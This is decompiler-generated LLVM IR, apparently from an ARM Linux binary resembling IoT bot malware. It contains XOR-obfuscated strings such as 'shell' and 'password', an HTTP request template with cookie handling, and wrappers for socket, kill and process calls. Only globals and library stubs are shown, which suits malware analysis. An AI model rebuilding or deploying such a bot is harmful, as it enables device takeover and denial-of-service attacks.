source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%_TYPEDEF_fd_set = type { [1 x i32] }
%timeval = type { i32, i32 }
%dirent = type { i32, i32, i16, i8, [256 x i8] }
%__dirstream = type { i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_1c014.2 = global i32 1
@global_var_1c0ac.3 = global i32* @global_var_1c014.2
@global_var_1c0b4.4 = global i32 0
@global_var_1c0b8.5 = global i32 35616
@global_var_1c0bc.6 = global i32 35616
@global_var_1c0c0.7 = global i32 35616
@global_var_1c0c4.8 = global i32 35616
@global_var_1c0c8.9 = global i32 35616
@global_var_1c0cc.10 = global i32 35616
@global_var_1c0d0.11 = global i32 35616
@global_var_1c0d4.12 = global i32 35616
@global_var_1c0d8.13 = global i32 35616
@global_var_1c0dc.14 = global i32 35616
@global_var_1c0e0.15 = global i32 35616
@global_var_1c0e4.16 = global i32 35616
@global_var_1c0e8.17 = global i32 35616
@global_var_1c0ec.18 = global i32 35616
@global_var_1c0f0.19 = global i32 35616
@global_var_1c0f4.20 = global i32 35616
@global_var_1c0f8.21 = global i32 35616
@global_var_1c0fc.22 = global i32 35616
@global_var_1c104.24 = global i32 35616
@global_var_1c108.25 = global i32 35616
@global_var_1c10c.26 = global i32 35616
@global_var_1c110.27 = global i32 35616
@global_var_1c114.28 = global i32 35616
@global_var_1c118.29 = global i32 35616
@global_var_1c11c.30 = global i32 35616
@global_var_1c120.31 = global i32 35616
@global_var_1c124.32 = global i32 35616
@global_var_1c128.33 = global i32 35616
@global_var_1c12c.34 = global i32 35616
@global_var_1c130.35 = global i32 35616
@global_var_1c134.36 = global i32 35616
@global_var_1c138.37 = global i32 35616
@global_var_1c13c.38 = global i32 35616
@global_var_1c140.39 = global i32 35616
@global_var_1c144.40 = global i32 35616
@global_var_1c148.41 = global i32 35616
@global_var_1c14c.42 = global i32 35616
@global_var_1c150.43 = global i32 35616
@global_var_1c158.45 = global i32 35616
@global_var_1c15c.46 = global i32 35616
@global_var_1c160.47 = global i32 35616
@global_var_1c164.48 = global i32 35616
@global_var_1c168.49 = global i32 35616
@global_var_1c16c.50 = global i32 35616
@global_var_1c170.51 = global i32 35616
@global_var_1c174.52 = global i32 35616
@global_var_1c178.53 = global i32 35616
@global_var_1c00c.57 = global i32 0
@global_var_1c184.58 = global i32* @global_var_1c00c.57
@global_var_1c1a4.64 = global i32 0
@global_var_fdf8.70 = constant i32 -382906384
@global_var_13694.73 = constant [4 x i8] c"GET\00"
@global_var_13698.75 = constant i32 47
@global_var_8d50.77 = constant i32 -493894144
@global_var_10000.78 = constant [3 x i8] c"K\0B\00"
@global_var_1368c.80 = constant i32 32
@global_var_13664.82 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_1367c.84 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_13688.86 = constant [3 x i8] c"\0D\0A\00"
@global_var_1369c.88 = constant [9 x i8] c"Cookie: \00"
@global_var_136a8.90 = constant [3 x i8] c"; \00"
@global_var_136ac.92 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_136b4.94 = constant i32 59
@global_var_136b8.96 = constant [5 x i8] c"http\00"
@global_var_136c0.98 = constant [5 x i8] c"url=\00"
@global_var_136c8.100 = constant [5 x i8] c"POST\00"
@global_var_12d5c.101 = constant i32 -439275520
@global_var_136d0.103 = constant i32 39
@global_var_139cc.105 = constant i32 61
@global_var_8d5c.106 = constant i32 -493894144
@global_var_1c1c0.110 = global i32 0
@global_var_b064.111 = constant i32 -352321555
@global_var_e4b8.117 = constant i32 -382906384
@global_var_e9b8.119 = constant i32 -382906384
@global_var_daec.121 = constant i32 -382906384
@global_var_d370.123 = constant i32 -382906384
@global_var_cbb4.125 = constant i32 -382906384
@global_var_c288.127 = constant i32 -382906384
@global_var_bb50.129 = constant i32 -382906384
@global_var_b3a8.131 = constant i32 -382906384
@global_var_8e9c.133 = constant i32 -382906384
@global_var_1c21c.135 = global i32 0
@global_var_1c1c4.146 = global i32 0
@global_var_1c220.150 = local_unnamed_addr global i32 0
@global_var_1c1c8.152 = global i32 0
@global_var_fb4c.154 = constant i32 -382910448
@global_var_1c194.156 = global i32 77804
@global_var_1c228.160 = local_unnamed_addr global i32 0
@global_var_1c227.161 = local_unnamed_addr global i32 0
@global_var_1c226.162 = local_unnamed_addr global i32 0
@global_var_1c18c.164 = global i32 -1
@global_var_1c1cc.169 = global i32 0
@global_var_1c225.175 = local_unnamed_addr global i32 0
@global_var_136d4.179 = constant i32 10
@global_var_1c190.181 = global i32 -1
@global_var_12fec.185 = constant i32 -382910224
@global_var_136d8.188 = constant i32 16777216
@global_var_1c1d4.190 = global i32 0
@global_var_1c1e0.192 = global i32 0
@global_var_1c1d8.194 = global i32 0
@global_var_1c1dc.196 = global i32 0
@global_var_1c23c.206 = global i32 0
@global_var_1c218.208 = global i32 0
@global_var_1c1e4.210 = global i32 0
@global_var_1c210.212 = global i32 0
@global_var_1c234.220 = global i32 0
@global_var_1c238.222 = global i32 0
@global_var_1c1e8.224 = global i32 0
@global_var_1c1eb.225 = local_unnamed_addr global i32 0
@global_var_1c1ea.226 = local_unnamed_addr global i32 0
@global_var_1c1fc.228 = global i32 0
@global_var_1c1f0.230 = local_unnamed_addr global i32 0
@global_var_1c1ed.231 = local_unnamed_addr global i32 0
@global_var_1c1fd.232 = local_unnamed_addr global i32 0
@global_var_1c1ff.233 = local_unnamed_addr global i32 0
@global_var_1c1f1.234 = local_unnamed_addr global i32 0
@global_var_1c1ec.235 = local_unnamed_addr global i32 0
@global_var_1c1fe.236 = local_unnamed_addr global i32 0
@global_var_1c20b.238 = local_unnamed_addr global i32 0
@global_var_1c20a.239 = local_unnamed_addr global i32 0
@global_var_137b8.241 = constant [6 x i8] c"14=9>\00"
@global_var_137c0.243 = constant [8 x i8] c"1!%1\229?\00"
@global_var_137c8.245 = constant [5 x i8] c" 1##\00"
@global_var_137d0.247 = constant [9 x i8] c"381>75=5\00"
@global_var_137dc.249 = constant i32 490349927
@global_var_136b0.251 = constant i32 0
@global_var_137b0.253 = constant [5 x i8] c"abcd\00"
@global_var_136e0.255 = constant [4 x i8] c"14=\00"
@global_var_136e4.257 = constant [5 x i8] c"\22??$\00"
@global_var_136ec.259 = constant [5 x i8] c"1>;?\00"
@global_var_136f4.261 = constant [7 x i8] c"(3ceaa\00"
@global_var_136fc.263 = constant [6 x i8] c"$$>5$\00"
@global_var_13704.265 = constant [9 x i8] c"8%>$egei\00"
@global_var_13710.267 = constant [6 x i8] c"&9*(&\00"
@global_var_13718.269 = constant [6 x i8] c"abcde\00"
@global_var_13720.271 = constant [9 x i8] c"a``a389>\00"
@global_var_1372c.273 = constant [8 x i8] c"4561%<$\00"
@global_var_13734.275 = constant [4 x i8] c"abc\00"
@global_var_13738.277 = constant [7 x i8] c"1>$#<!\00"
@global_var_13740.279 = constant [4 x i8] c"e% \00"
@global_var_13744.281 = constant [9 x i8] c":%1>$538\00"
@global_var_13750.283 = constant [6 x i8] c"*<((~\00"
@global_var_13758.285 = constant [7 x i8] c"abcdef\00"
@global_var_13760.287 = constant [11 x i8] c"?5<9>%(abc\00"
@global_var_1376c.289 = constant [7 x i8] c"\0A$5eba\00"
@global_var_13774.291 = constant i32 490349927
@global_var_13784.293 = constant [5 x i8] c"%#5\22\00"
@global_var_1378c.295 = constant [7 x i8] c"415=?>\00"
@global_var_13794.297 = constant [4 x i8] c"29>\00"
@global_var_13798.299 = constant [8 x i8] c"#%  ?\22$\00"
@global_var_137a0.301 = constant [11 x i8] c"#% 5\22&9#?\22\00"
@global_var_137ac.303 = constant [9 x i8] c"*)14abcd\00"
@global_var_1c1f4.304 = local_unnamed_addr global i32 0
@global_var_1c1f2.306 = local_unnamed_addr global i32 0
@global_var_1c1f3.307 = local_unnamed_addr global i32 0
@global_var_1c20c.309 = local_unnamed_addr global i32 0
@global_var_1c20d.310 = local_unnamed_addr global i32 0
@global_var_137f2.317 = constant i32 2096127
@global_var_137e9.319 = constant i32 2095871
@global_var_1c244.323 = global i32 0
@global_var_1c19c.326 = global i32 1043935
@global_var_137f8.331 = constant i32 39228
@global_var_1c254.332 = local_unnamed_addr global i32 0
@global_var_1c258.333 = local_unnamed_addr global i32 0
@global_var_1c259.334 = local_unnamed_addr global i32 0
@global_var_137fc.336 = constant i32 55430
@global_var_1c264.337 = local_unnamed_addr global i32 0
@global_var_1c268.338 = local_unnamed_addr global i32 0
@global_var_1c269.339 = local_unnamed_addr global i32 0
@global_var_13800.341 = constant i32 1499028601
@global_var_1c270.342 = local_unnamed_addr global i32 0
@global_var_1c26c.343 = local_unnamed_addr global i32 0
@global_var_1c271.344 = local_unnamed_addr global i32 0
@global_var_13820.346 = constant i32 1380928786
@global_var_1c274.347 = local_unnamed_addr global i32 0
@global_var_1c278.348 = local_unnamed_addr global i32 0
@global_var_1c279.349 = local_unnamed_addr global i32 0
@global_var_13828.351 = constant i32 1480939538
@global_var_1c280.352 = local_unnamed_addr global i32 0
@global_var_1c27c.353 = local_unnamed_addr global i32 0
@global_var_1c281.354 = local_unnamed_addr global i32 0
@global_var_13830.356 = constant i32 1029266194
@global_var_1c288.357 = local_unnamed_addr global i32 0
@global_var_1c284.358 = local_unnamed_addr global i32 0
@global_var_1c289.359 = local_unnamed_addr global i32 0
@global_var_13838.361 = constant i32 1380928786
@global_var_1c290.362 = local_unnamed_addr global i32 0
@global_var_1c28c.363 = local_unnamed_addr global i32 0
@global_var_1c291.364 = local_unnamed_addr global i32 0
@global_var_13848.366 = constant i32 1297895442
@global_var_1c294.367 = local_unnamed_addr global i32 0
@global_var_1c298.368 = local_unnamed_addr global i32 0
@global_var_1c299.369 = local_unnamed_addr global i32 0
@global_var_13850.371 = constant i32 1548307986
@global_var_1c29c.372 = local_unnamed_addr global i32 0
@global_var_1c2a0.373 = local_unnamed_addr global i32 0
@global_var_1c2a1.374 = local_unnamed_addr global i32 0
@global_var_1385c.376 = constant i32 1414749203
@global_var_1c2a4.377 = local_unnamed_addr global i32 0
@global_var_1c2a8.378 = local_unnamed_addr global i32 0
@global_var_1c2a9.379 = local_unnamed_addr global i32 0
@global_var_13864.381 = constant i32 1380928786
@global_var_1c2b0.382 = local_unnamed_addr global i32 0
@global_var_1c2ac.383 = local_unnamed_addr global i32 0
@global_var_1c2b1.384 = local_unnamed_addr global i32 0
@global_var_13878.386 = constant i32 1380928786
@global_var_1c2b8.387 = local_unnamed_addr global i32 0
@global_var_1c2b4.388 = local_unnamed_addr global i32 0
@global_var_1c2b9.389 = local_unnamed_addr global i32 0
@global_var_13888.391 = constant i32 1920627327
@global_var_1c2bc.392 = local_unnamed_addr global i32 0
@global_var_1c2c0.393 = local_unnamed_addr global i32 0
@global_var_1c2c1.394 = local_unnamed_addr global i32 0
@global_var_13894.396 = constant i32 1581864978
@global_var_1c2c8.397 = local_unnamed_addr global i32 0
@global_var_1c2c4.398 = local_unnamed_addr global i32 0
@global_var_1c2c9.399 = local_unnamed_addr global i32 0
@global_var_138a8.401 = constant i32 1599867994
@global_var_1c2cc.402 = local_unnamed_addr global i32 0
@global_var_1c2d0.403 = local_unnamed_addr global i32 0
@global_var_1c2d1.404 = local_unnamed_addr global i32 0
@global_var_138c0.406 = constant [9 x i8] c"\5CNNJROY=\00"
@global_var_1c2d4.407 = local_unnamed_addr global i32 0
@global_var_1c2d8.408 = local_unnamed_addr global i32 0
@global_var_1c2d9.409 = local_unnamed_addr global i32 0
@global_var_138cc.411 = constant i32 1264081170
@global_var_1c2e0.412 = local_unnamed_addr global i32 0
@global_var_1c2dc.413 = local_unnamed_addr global i32 0
@global_var_1c2e1.414 = local_unnamed_addr global i32 0
@global_var_138dc.416 = constant i32 1264081170
@global_var_1c2e8.417 = local_unnamed_addr global i32 0
@global_var_1c2e4.418 = local_unnamed_addr global i32 0
@global_var_1c2e9.419 = local_unnamed_addr global i32 0
@global_var_138f0.421 = constant i32 1264081170
@global_var_1c2ec.422 = local_unnamed_addr global i32 0
@global_var_1c2f0.423 = local_unnamed_addr global i32 0
@global_var_1c2f1.424 = local_unnamed_addr global i32 0
@global_var_13908.426 = constant i32 1264081170
@global_var_1c2f8.427 = local_unnamed_addr global i32 0
@global_var_1c2f4.428 = local_unnamed_addr global i32 0
@global_var_1c2f9.429 = local_unnamed_addr global i32 0
@global_var_13924.431 = constant i32 1264081170
@global_var_1c300.432 = local_unnamed_addr global i32 0
@global_var_1c2fc.433 = local_unnamed_addr global i32 0
@global_var_1c301.434 = local_unnamed_addr global i32 0
@global_var_13934.436 = constant [7 x i8] c"NUXQQ=\00"
@global_var_1c304.437 = local_unnamed_addr global i32 0
@global_var_1c308.438 = local_unnamed_addr global i32 0
@global_var_1c309.439 = local_unnamed_addr global i32 0
@global_var_1393c.441 = constant [8 x i8] c"XS\5C_QX=\00"
@global_var_1c30c.442 = local_unnamed_addr global i32 0
@global_var_1c310.443 = local_unnamed_addr global i32 0
@global_var_1c311.444 = local_unnamed_addr global i32 0
@global_var_13944.446 = constant [8 x i8] c"NDNIXP=\00"
@global_var_1c314.447 = local_unnamed_addr global i32 0
@global_var_1c318.448 = local_unnamed_addr global i32 0
@global_var_1c319.449 = local_unnamed_addr global i32 0
@global_var_1394c.451 = constant [4 x i8] c"NU=\00"
@global_var_1c320.452 = local_unnamed_addr global i32 0
@global_var_1c31c.453 = local_unnamed_addr global i32 0
@global_var_1c321.454 = local_unnamed_addr global i32 0
@global_var_13950.456 = constant i32 1398038290
@global_var_1c324.457 = local_unnamed_addr global i32 0
@global_var_1c328.458 = local_unnamed_addr global i32 0
@global_var_1c329.459 = local_unnamed_addr global i32 0
@global_var_13968.461 = constant i32 1499028569
@global_var_1c330.462 = local_unnamed_addr global i32 0
@global_var_1c32c.463 = local_unnamed_addr global i32 0
@global_var_1c331.464 = local_unnamed_addr global i32 0
@global_var_13988.466 = constant [10 x i8] c"S^ROOX^I=\00"
@global_var_1c334.467 = local_unnamed_addr global i32 0
@global_var_1c338.468 = local_unnamed_addr global i32 0
@global_var_1c339.469 = local_unnamed_addr global i32 0
@global_var_1c33c.470 = local_unnamed_addr global i32 0
@global_var_1c340.471 = local_unnamed_addr global i32 0
@global_var_1c341.472 = local_unnamed_addr global i32 0
@global_var_13994.474 = constant [6 x i8] c"RZTS=\00"
@global_var_1c348.475 = local_unnamed_addr global i32 0
@global_var_1c344.476 = local_unnamed_addr global i32 0
@global_var_1c349.477 = local_unnamed_addr global i32 0
@global_var_1399c.479 = constant [7 x i8] c"XSIXO=\00"
@global_var_1c34c.480 = local_unnamed_addr global i32 0
@global_var_1c350.481 = local_unnamed_addr global i32 0
@global_var_1c351.482 = local_unnamed_addr global i32 0
@global_var_139a4.484 = constant i32 1398038290
@global_var_1c358.485 = local_unnamed_addr global i32 0
@global_var_1c354.486 = local_unnamed_addr global i32 0
@global_var_1c359.487 = local_unnamed_addr global i32 0
@global_var_139b8.489 = constant i32 1398038290
@global_var_1c35c.490 = local_unnamed_addr global i32 0
@global_var_1c360.491 = local_unnamed_addr global i32 0
@global_var_1c361.492 = local_unnamed_addr global i32 0
@global_var_139d0.494 = constant i32 1213361769
@global_var_1c364.495 = local_unnamed_addr global i32 0
@global_var_1c368.496 = local_unnamed_addr global i32 0
@global_var_1c369.497 = local_unnamed_addr global i32 0
@global_var_139e8.499 = constant i32 1581864978
@global_var_1c370.500 = local_unnamed_addr global i32 0
@global_var_1c36c.501 = local_unnamed_addr global i32 0
@global_var_1c371.502 = local_unnamed_addr global i32 0
@global_var_139fc.504 = constant [12 x i8] c"S\5CPXNXOKXO=\00"
@global_var_1c374.505 = local_unnamed_addr global i32 0
@global_var_1c378.506 = local_unnamed_addr global i32 0
@global_var_1c379.507 = local_unnamed_addr global i32 0
@global_var_13a08.509 = constant i32 1397969534
@global_var_1c37c.510 = local_unnamed_addr global i32 0
@global_var_1c380.511 = local_unnamed_addr global i32 0
@global_var_1c381.512 = local_unnamed_addr global i32 0
@global_var_13d2c.514 = constant i32 1482579580
@global_var_1c388.515 = local_unnamed_addr global i32 0
@global_var_1c384.516 = local_unnamed_addr global i32 0
@global_var_1c389.517 = local_unnamed_addr global i32 0
@global_var_13d80.519 = constant i32 1482579580
@global_var_1c390.520 = local_unnamed_addr global i32 0
@global_var_1c38c.521 = local_unnamed_addr global i32 0
@global_var_1c391.522 = local_unnamed_addr global i32 0
@global_var_13a20.524 = constant i32 1230197374
@global_var_1c398.525 = local_unnamed_addr global i32 0
@global_var_1c394.526 = local_unnamed_addr global i32 0
@global_var_1c399.527 = local_unnamed_addr global i32 0
@global_var_13a54.529 = constant i32 2118735950
@global_var_1c39c.530 = local_unnamed_addr global i32 0
@global_var_1c3a0.531 = local_unnamed_addr global i32 0
@global_var_1c3a1.532 = local_unnamed_addr global i32 0
@global_var_13a64.534 = constant i32 1331386447
@global_var_1c3a4.535 = local_unnamed_addr global i32 0
@global_var_1c3a8.536 = local_unnamed_addr global i32 0
@global_var_1c3a9.537 = local_unnamed_addr global i32 0
@global_var_13a70.539 = constant i32 1549685329
@global_var_1c3ac.540 = local_unnamed_addr global i32 0
@global_var_1c3b0.541 = local_unnamed_addr global i32 0
@global_var_1c3b1.542 = local_unnamed_addr global i32 0
@global_var_13a7c.544 = constant i32 273242190
@global_var_1c3b4.545 = local_unnamed_addr global i32 0
@global_var_1c3b8.546 = local_unnamed_addr global i32 0
@global_var_1c3b9.547 = local_unnamed_addr global i32 0
@global_var_13a8c.549 = constant i32 1230197342
@global_var_1c3c0.550 = local_unnamed_addr global i32 0
@global_var_1c3bc.551 = local_unnamed_addr global i32 0
@global_var_1c3c1.552 = local_unnamed_addr global i32 0
@global_var_13aa0.554 = constant i32 1398558537
@global_var_1c3c8.555 = local_unnamed_addr global i32 0
@global_var_1c3c4.556 = local_unnamed_addr global i32 0
@global_var_1c3c9.557 = local_unnamed_addr global i32 0
@global_var_13ab4.559 = constant [9 x i8] c"^UHSVXY=\00"
@global_var_1c3cc.560 = local_unnamed_addr global i32 0
@global_var_1c3d0.561 = local_unnamed_addr global i32 0
@global_var_1c3d1.562 = local_unnamed_addr global i32 0
@global_var_13a14.564 = constant i32 1297635414
@global_var_1c3d4.565 = local_unnamed_addr global i32 0
@global_var_1c3d8.566 = local_unnamed_addr global i32 0
@global_var_1c3d9.567 = local_unnamed_addr global i32 0
@global_var_13ac0.569 = constant i32 1397969502
@global_var_1c3dc.570 = local_unnamed_addr global i32 0
@global_var_1c3e0.571 = local_unnamed_addr global i32 0
@global_var_1c3e1.572 = local_unnamed_addr global i32 0
@global_var_13ad0.574 = constant i32 1263491150
@global_var_1c3e8.575 = local_unnamed_addr global i32 0
@global_var_1c3e4.576 = local_unnamed_addr global i32 0
@global_var_1c3e9.577 = local_unnamed_addr global i32 0
@global_var_13ae4.579 = constant i32 1263491150
@global_var_1c3f0.580 = local_unnamed_addr global i32 0
@global_var_1c3ec.581 = local_unnamed_addr global i32 0
@global_var_1c3f1.582 = local_unnamed_addr global i32 0
@global_var_13b00.584 = constant i32 1413960304
@global_var_1c3f4.585 = local_unnamed_addr global i32 0
@global_var_1c3f8.586 = local_unnamed_addr global i32 0
@global_var_1c3f9.587 = local_unnamed_addr global i32 0
@global_var_13b74.589 = constant i32 1413960304
@global_var_1c3fc.590 = local_unnamed_addr global i32 0
@global_var_1c400.591 = local_unnamed_addr global i32 0
@global_var_1c401.592 = local_unnamed_addr global i32 0
@global_var_13be8.594 = constant i32 1413960304
@global_var_1c408.595 = local_unnamed_addr global i32 0
@global_var_1c404.596 = local_unnamed_addr global i32 0
@global_var_1c409.597 = local_unnamed_addr global i32 0
@global_var_13c38.599 = constant i32 1413960304
@global_var_1c40c.600 = local_unnamed_addr global i32 0
@global_var_1c410.601 = local_unnamed_addr global i32 0
@global_var_1c411.602 = local_unnamed_addr global i32 0
@global_var_13cac.604 = constant i32 1413960304
@global_var_1c418.605 = local_unnamed_addr global i32 0
@global_var_1c414.606 = local_unnamed_addr global i32 0
@global_var_1c419.607 = local_unnamed_addr global i32 0
@global_var_1c420.608 = local_unnamed_addr global i32 0
@global_var_1c41c.609 = local_unnamed_addr global i32 0
@global_var_1c421.610 = local_unnamed_addr global i32 0
@global_var_1c428.611 = local_unnamed_addr global i32 0
@global_var_1c424.612 = local_unnamed_addr global i32 0
@global_var_1c429.613 = local_unnamed_addr global i32 0
@global_var_1c42c.614 = local_unnamed_addr global i32 0
@global_var_1c430.615 = local_unnamed_addr global i32 0
@global_var_1c431.616 = local_unnamed_addr global i32 0
@global_var_13d20.618 = constant [11 x i8] c"YKOuXQMXO=\00"
@global_var_1c434.619 = local_unnamed_addr global i32 0
@global_var_1c438.620 = local_unnamed_addr global i32 0
@global_var_1c004.622 = global i32 0
@global_var_1c000.623 = global i32 -1
@global_var_1c1a0.55 = external global i8*
@global_var_1c1bc.108 = external global i8*
@global_var_1c1bd.115 = global i8 0
@global_var_1c224.158 = global %sockaddr* null
@1 = internal constant [2 x i8] c"\01\00"
@global_var_1c198.166 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_fb34.171 = constant void (i32)* inttoptr (i32 -442556408 to void (i32)*)
@global_var_1c1d0.184 = external global i8*
@global_var_1c214.214 = external global i8*
@global_var_1c215.215 = local_unnamed_addr global i8 0
@global_var_1c208.229 = local_unnamed_addr global i8 0
@global_var_1c209.237 = local_unnamed_addr global i8 0
@global_var_1c200.308 = local_unnamed_addr global i8 0
@global_var_1c1f8.305 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8b08() local_unnamed_addr {
entry:
  %v3_8b0c = load i32, i32* @r4, align 4
  %v0_8b14 = call i32 @function_8e00()
  store i32 %v0_8b14, i32* @r0, align 4
  %v1_8b18 = call i32 @function_13604(i32 %v0_8b14)
  call void @__pseudo_branch(i32 %v3_8b0c)
  ret i32 %v1_8b18
}

define i32 @function_8b20(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8b2c = load i32, i32* @global_var_1c0b4.4, align 4
  call void @__pseudo_branch(i32 %v3_8b2c)
  %v0_8b30 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8b30, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v10_8b30 = load i32, i32* @r0, align 4
  ret i32 %v10_8b30

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i8* @_strcpy(i8* %dest, i8* %src) local_unnamed_addr {
entry:
  %v8_8b3c = call i8* @strcpy(i8* %dest, i8* %src)
  ret i8* %v8_8b3c
}

define i32 @_ioctl(i32 %fd, i32 %request, ...) local_unnamed_addr {
entry:
  %v6_8b48 = call i32 (i32, i32, ...) @ioctl(i32 %fd, i32 %request)
  ret i32 %v6_8b48
}

define i32 @_recv(i32 %fd, i32* %buf, i32 %n, i32 %flags) local_unnamed_addr {
entry:
  %v9_8b54 = call i32 @recv(i32 %fd, i32* %buf, i32 %n, i32 %flags)
  ret i32 %v9_8b54
}

define i32 @_connect(i32 %fd, %sockaddr* %addr, i32 %len) local_unnamed_addr {
entry:
  %v8_8b60 = call i32 @connect(i32 %fd, %sockaddr* %addr, i32 %len)
  ret i32 %v8_8b60
}

define i32 @_sigemptyset(%_TYPEDEF_sigset_t* %set) local_unnamed_addr {
entry:
  %v6_8b6c = call i32 @sigemptyset(%_TYPEDEF_sigset_t* %set)
  ret i32 %v6_8b6c
}

define i32* @_memmove(i32* %dest, i32* %src, i32 %n) local_unnamed_addr {
entry:
  %v9_8b78 = call i32* @memmove(i32* %dest, i32* %src, i32 %n)
  ret i32* %v9_8b78
}

define i32 @_getpid() local_unnamed_addr {
entry:
  %v4_8b84 = call i32 @getpid()
  ret i32 %v4_8b84
}

define i32 @_prctl(i32 %option, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v9_8b90 = call i32 @prctl(i32 %option, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  ret i32 %v9_8b90
}

define i32* @_memcpy(i32* %dest, i32* %src, i32 %n) local_unnamed_addr {
entry:
  %v9_8b9c = call i32* @memcpy(i32* %dest, i32* %src, i32 %n)
  ret i32* %v9_8b9c
}

define i32 @_readlink(i8* %path, i8* %buf, i32 %len) local_unnamed_addr {
entry:
  %v9_8ba8 = call i32 @readlink(i8* %path, i8* %buf, i32 %len)
  ret i32 %v9_8ba8
}

define i32* @_malloc(i32 %size) local_unnamed_addr {
entry:
  %v5_8bb4 = call i32* @malloc(i32 %size)
  ret i32* %v5_8bb4
}

define i32 @_sleep(i32 %seconds) local_unnamed_addr {
entry:
  %v5_8bc0 = call i32 @sleep(i32 %seconds)
  ret i32 %v5_8bc0
}

define i32 @_recvfrom(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32* %addr_len) local_unnamed_addr {
entry:
  %v10_8bcc = call i32 @recvfrom(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32* %addr_len)
  ret i32 %v10_8bcc
}

define i32 @_socket(i32 %domain, i32 %type, i32 %protocol) local_unnamed_addr {
entry:
  %v7_8bd8 = call i32 @socket(i32 %domain, i32 %type, i32 %protocol)
  ret i32 %v7_8bd8
}

define i32 @_select(i32 %nfds, %_TYPEDEF_fd_set* %readfds, %_TYPEDEF_fd_set* %writefds, %_TYPEDEF_fd_set* %exceptfds, %timeval* %timeout) local_unnamed_addr {
entry:
  %v12_8be4 = call i32 @select(i32 %nfds, %_TYPEDEF_fd_set* %readfds, %_TYPEDEF_fd_set* %writefds, %_TYPEDEF_fd_set* %exceptfds, %timeval* %timeout)
  ret i32 %v12_8be4
}

define %dirent* @_readdir(%__dirstream* %dirp) local_unnamed_addr {
entry:
  %v6_8bf0 = call %dirent* @readdir(%__dirstream* %dirp)
  ret %dirent* %v6_8bf0
}

define i32 @_sigaddset(%_TYPEDEF_sigset_t* %set, i32 %signo) local_unnamed_addr {
entry:
  %v7_8bfc = call i32 @sigaddset(%_TYPEDEF_sigset_t* %set, i32 %signo)
  ret i32 %v7_8bfc
}

define i32 @_send(i32 %fd, i32* %buf, i32 %n, i32 %flags) local_unnamed_addr {
entry:
  %v9_8c08 = call i32 @send(i32 %fd, i32* %buf, i32 %n, i32 %flags)
  ret i32 %v9_8c08
}

; Function Attrs: noreturn
define void @_abort() local_unnamed_addr #0 {
entry:
  call void @abort()
  unreachable
}

define i32 @_accept(i32 %fd, %sockaddr* %addr, i32* %addr_len) local_unnamed_addr {
entry:
  %v9_8c20 = call i32 @accept(i32 %fd, %sockaddr* %addr, i32* %addr_len)
  ret i32 %v9_8c20
}

define i32* @_calloc(i32 %nmemb, i32 %size) local_unnamed_addr {
entry:
  %v6_8c2c = call i32* @calloc(i32 %nmemb, i32 %size)
  ret i32* %v6_8c2c
}

define i32 @_write(i32 %fd, i32* %buf, i32 %n) local_unnamed_addr {
entry:
  %v8_8c38 = call i32 @write(i32 %fd, i32* %buf, i32 %n)
  ret i32 %v8_8c38
}

define i32 @_kill(i32 %pid, i32 %sig) local_unnamed_addr {
entry:
  %v6_8c44 = call i32 @kill(i32 %pid, i32 %sig)
  ret i32 %v6_8c44
}

define i32 @_bind(i32 %fd, %sockaddr* %addr, i32 %len) local_unnamed_addr {
entry:
  %v8_8c50 = call i32 @bind(i32 %fd, %sockaddr* %addr, i32 %len)
  ret i32 %v8_8c50
}

define i32 @_inet_addr(i8* %cp) local_unnamed_addr {
entry:
  %v6_8c5c = call i32 @inet_addr(i8* %cp)
  ret i32 %v6_8c5c
}

define i32 @_setsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32 %optlen) local_unnamed_addr {
entry:
  %v10_8c68 = call i32 @setsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32 %optlen)
  ret i32 %v10_8c68
}

define void (i32)* @_signal(i32 %sig, void (i32)* %handler) local_unnamed_addr {
entry:
  %v7_8c74 = call void (i32)* @signal(i32 %sig, void (i32)* %handler)
  ret void (i32)* %v7_8c74
}

define i32 @_read(i32 %fd, i32* %buf, i32 %nbytes) local_unnamed_addr {
entry:
  %v8_8c80 = call i32 @read(i32 %fd, i32* %buf, i32 %nbytes)
  ret i32 %v8_8c80
}

define i32 @_sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len) local_unnamed_addr {
entry:
  %v11_8c8c = call i32 @sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len)
  ret i32 %v11_8c8c
}

define i32* @_realloc(i32* %ptr, i32 %size) local_unnamed_addr {
entry:
  %v7_8c98 = call i32* @realloc(i32* %ptr, i32 %size)
  ret i32* %v7_8c98
}

define i32 @_listen(i32 %fd, i32 %n) local_unnamed_addr {
entry:
  %v6_8ca4 = call i32 @listen(i32 %fd, i32 %n)
  ret i32 %v6_8ca4
}

